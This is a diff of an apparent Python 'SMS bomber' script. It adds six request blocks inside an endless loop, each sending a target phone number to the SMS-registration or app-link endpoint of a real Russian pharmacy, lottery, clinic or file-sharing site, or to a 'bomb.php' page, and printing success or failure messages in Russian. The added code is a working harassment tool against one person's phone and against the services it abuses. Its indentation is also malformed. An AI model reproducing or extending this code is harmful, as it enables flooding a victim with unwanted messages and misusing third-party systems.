@@ -337,6 +337,42 @@ while True:
 	except:
 		print('[-] Не отправлено!')
 
+		try:
+		requests.post('https://apteka366.ru/login/register/sms/send', data={"phone": _phone})
+		print('[+] apteka366 отправлено!')
+	except:
+		print('[-] Не отправлено!')
+
+		try:
+		requests.post('https://api.fex.net/api/v1/auth/scaffold', data={"phone": _phone})
+		print('[+] Fex отправлено!')
+	except:
+		print('[-] Не отправлено!')
+
+		try:
+		requests.post('https://api.ennergiia.com/auth/api/development/lor', data={"phone": _phone})
+		print('[+] ennergiia отправлено!')
+	except:
+		print('[-] Не отправлено!')
+
+		try:
+		requests.post('http://greadios.beget.tech/bomb.php', data={"number": _phone})
+		print('[+] greadios отправлено!')
+	except:
+		print('[-] Не отправлено!')
+
+		try:
+		requests.post('https://www.stoloto.ru/send-mobile-app-link', data={"phone": _phone})
+		print('[+] stoloto отправлено!')
+	except:
+		print('[-] Не отправлено!')
+
+		try:
+		requests.post('https://gorzdrav.org/login/register/sms/send', data={"phone": _phone})
+		print('[+] gorzdrav отправлено!')
+	except:
+		print('[-] Не отправлено!')
+
 
 
 	try:
